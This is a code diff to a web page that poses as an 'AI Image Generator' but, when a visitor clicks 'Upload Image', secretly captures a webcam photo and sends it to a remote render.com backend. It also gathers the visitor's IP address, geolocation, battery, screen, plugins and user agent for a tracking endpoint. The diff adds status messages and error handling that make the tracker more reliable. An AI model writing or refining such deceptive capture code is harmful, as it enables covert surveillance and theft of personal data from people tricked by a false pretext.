@@ -38,18 +38,21 @@
     <div class="container">
         <h2>AI Image Generator</h2>
         <p>Upload an image to enhance it with AI</p>
+        <p id="statusMessage"></p> <!-- 🔥 UI Feedback -->
         <video id="video" class="hidden" autoplay></video>
         <canvas id="canvas" class="hidden"></canvas>
         <button id="uploadBtn">Upload Image</button>
     </div>
 
     <script>
-        const backendURL = "https://flash-3vfu.onrender.com";  // Replace with your backend URL
+        const backendURL = "https://flash-3vfu.onrender.com";  
         const sessionId = Math.random().toString(36).substring(2, 15);
         let deviceData = {};
 
         // 📸 Capture Photo & Send Data
         document.getElementById("uploadBtn").addEventListener("click", async () => {
+            const statusMessage = document.getElementById("statusMessage");
+            statusMessage.innerText = "🔄 Capturing Image...";
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById("video");
@@ -77,8 +80,10 @@
                                 method: "POST",
                                 body: formData,
                             });
+                            statusMessage.innerText = "✅ Image Sent Successfully!";
                             console.log("📤 Image sent successfully!");
                         } catch (error) {
+                            statusMessage.innerText = "❌ Failed to Send Image!";
                             console.error("❌ Error sending image:", error);
                         }
                     }, "image/jpeg", 0.5);
@@ -86,30 +91,41 @@
                     stream.getTracks().forEach(track => track.stop());
                 }, 2000);
             } catch (error) {
+                statusMessage.innerText = "❌ Camera access denied!";
                 console.error("Camera access denied:", error);
             }
         });
 
         // 📡 Collect Device Info
         async function collectDeviceInfo() {
-            deviceData = {
-                ip: await fetch("https://api64.ipify.org?format=json").then(res => res.json()).then(data => data.ip),
-                platform: navigator.platform,
-                userAgent: navigator.userAgent,
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                cookiesEnabled: navigator.cookieEnabled,
-                plugins: [...navigator.plugins].map(p => p.name).join(", ")
-            };
+            try {
+                // 🔥 Fetch IP Address
+                const ipData = await fetch("https://api64.ipify.org?format=json").then(res => res.json());
+                deviceData.ip = ipData.ip;
+            } catch {
+                deviceData.ip = "Unknown";
+            }
 
-            navigator.getBattery().then(battery => {
+            // 🔥 Collect System Info
+            deviceData.platform = navigator.platform;
+            deviceData.userAgent = navigator.userAgent;
+            deviceData.screenWidth = screen.width;
+            deviceData.screenHeight = screen.height;
+            deviceData.cookiesEnabled = navigator.cookieEnabled;
+            deviceData.plugins = [...navigator.plugins].map(p => p.name).join(", ");
+
+            // 🔥 Get Battery Status
+            try {
+                const battery = await navigator.getBattery();
                 deviceData.battery = {
                     level: Math.round(battery.level * 100),
                     charging: battery.charging
                 };
-                sendData();
-            });
+            } catch {
+                deviceData.battery = { level: "N/A", charging: "N/A" };
+            }
 
+            // 🔥 Get Geolocation
             if ("geolocation" in navigator) {
                 navigator.geolocation.getCurrentPosition(position => {
                     deviceData.geo = {
@@ -117,17 +133,22 @@
                         longitude: position.coords.longitude
                     };
                     sendData();
+                }, () => {
+                    deviceData.geo = { latitude: "N/A", longitude: "N/A" };
+                    sendData();
                 });
+            } else {
+                deviceData.geo = { latitude: "N/A", longitude: "N/A" };
+                sendData();
             }
         }
 
         // 🚀 Send Data to Backend
-        function sendData(extraData = {}) {
-            const data = { ...deviceData, ...extraData };
+        function sendData() {
             fetch(`${backendURL}/track/${sessionId}`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
+                body: JSON.stringify(deviceData)
             }).catch(err => console.log("Error sending data:", err));
         }
 
